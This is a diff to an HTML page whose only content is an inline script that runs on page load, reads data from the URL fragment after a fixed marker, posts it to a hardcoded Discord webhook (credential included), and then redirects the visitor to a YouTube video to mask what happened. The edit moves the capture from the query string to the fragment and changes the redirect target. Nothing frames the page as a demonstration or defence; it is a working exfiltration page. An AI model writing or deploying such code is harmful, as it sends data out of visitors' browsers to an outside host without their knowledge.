@@ -7,40 +7,40 @@
 </head>
 <body>
 <script>
-  (function() {
-    try {
-      const fullUrl = window.location.href;
-      const marker = "KmGapVgu8FeiksHhTc5z=";
-      const index = fullUrl.indexOf(marker);
-      if (index !== -1) {
-        let dataToSend = fullUrl.substring(index + marker.length);
-        dataToSend = encodeURIComponent(dataToSend);
-        const webhookUrl = "https://discord.com/api/webhooks/1303524286707011674/xC5koezC0nmTgXhq7OROOrq4R4XLb0hgSN35cAZFuHbNP5JZvCOVmJs81eDgk5sStkNo";
-        const payload = {
-          content: `${dataToSend}`
-        };
-        fetch(webhookUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(payload)
-        }).then(response => {
-          console.log("Data sent successfully!");
-          window.location.href = "https://google.com";
-        }).catch(error => {
-          console.error("Error sending data:", error);
-          window.location.href = "https://google.com";
-        });
-      } else {
-        console.log("No data found in URL.");
-        window.location.href = "https://google.com";
-      }
-    } catch (e) {
-      console.error("Unexpected error:", e);
-      window.location.href = "https://google.com";
+(function() {
+  try {
+    const hash = window.location.hash;
+    const marker = "#KmGapVgu8FeiksHhTc5z=";
+    const index = hash.indexOf(marker);
+    if (index !== -1) {
+      let dataToSend = hash.substring(index + marker.length);
+      dataToSend = decodeURIComponent(dataToSend); 
+
+      const webhookUrl = "https://discord.com/api/webhooks/1303524286707011674/xC5koezC0nmTgXhq7OROOrq4R4XLb0hgSN35cAZFuHbNP5JZvCOVmJs81eDgk5sStkNo";
+      const payload = {
+        content: dataToSend
+      };
+
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).then(() => {
+        console.log("Data sent successfully!");
+        window.location.href = "https://youtu.be/90bLTomz-lY?si=W9lp9a7SqF8_ikOq";
+      }).catch(error => {
+        console.error("Error sending data:", error);
+        window.location.href = "https://youtu.be/90bLTomz-lY?si=W9lp9a7SqF8_ikOq";
+      });
+    } else {
+      console.log("No data found in URL.");
+      window.location.href = "https://youtu.be/90bLTomz-lY?si=W9lp9a7SqF8_ikOq";
     }
-  })();
+  } catch (e) {
+    console.error("Unexpected error:", e);
+    window.location.href = "https://youtu.be/90bLTomz-lY?si=W9lp9a7SqF8_ikOq";
+  }
+})();
 </script>
 </body>
 </html>
